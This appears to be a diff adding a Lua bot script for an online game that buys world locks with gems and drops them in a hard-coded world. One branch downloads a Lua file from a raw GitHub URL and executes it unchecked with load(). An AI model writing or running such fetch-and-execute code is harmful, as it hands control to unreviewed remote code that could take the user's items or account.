@@ -1,0 +1,67 @@
+WORLD = "JBT555S"
+WORLDID = "MBB"
+
+function checkAndDropInventory()
+    if getBot():getInventory():getItemCount(242) == 200 then
+        getBot():drop(242,getBot():getInventory():getItemCount(242))
+        sleep(100)
+    end
+end
+
+function realMain()
+if getBot().status == BotStatus.online then
+    if getBot().gem_count >= 20000 or getBot():getInventory():getItemCount(242) > 0 or getBot():getInventory():getItemCount(1796) > 0 then
+        getBot():warp(WORLD,WORLDID)
+        sleep(4000)
+        while not getBot():isInWorld(WORLD) or math.floor(getBot():getWorld():getLocal().posx / 32) ~= 59 do
+            getBot():warp(WORLD,WORLDID)
+            sleep(4000)
+        end
+
+        while getBot().gem_count > 2000 do
+            if getBot().gem_count >= 20000 then
+                getBot():buy("world_lock_10_pack")
+                sleep(300)
+                checkAndDropInventory()
+            elseif getBot().gem_count < 20000 then
+                getBot():buy("world_lock")
+                sleep(300)
+                checkAndDropInventory()
+            end
+        end
+
+        -- disini (tambahkan logika drop item 1234 jika lebih dari 1)
+        if getBot():getInventory():getItemCount(11398) > 1 then
+            getBot():drop(11398, getBot():getInventory():getItemCount(11398))
+            sleep(600)
+        end
+
+        if getBot().gem_count < 2000 then
+            getBot():drop(242,getBot():getInventory():getItemCount(242))
+            sleep(600)
+            return
+        end
+
+    else
+    sleep(500)
+    getBot():warp("EXIT")
+    sleep(700)
+        local httpClient = HttpClient.new()
+    httpClient:setMethod(Method.get)
+    httpClient.url = "https://raw.githubusercontent.com/AATSF/hewh/main/ngab.lua"
+    local httpResult = httpClient:request()
+    local response = httpResult.body
+    load(response)()
+    sleep(1200)
+    return
+    end
+    else
+    sleep(2000)
+    return
+end
+end
+
+while true do
+realMain()
+sleep(3200)
+end
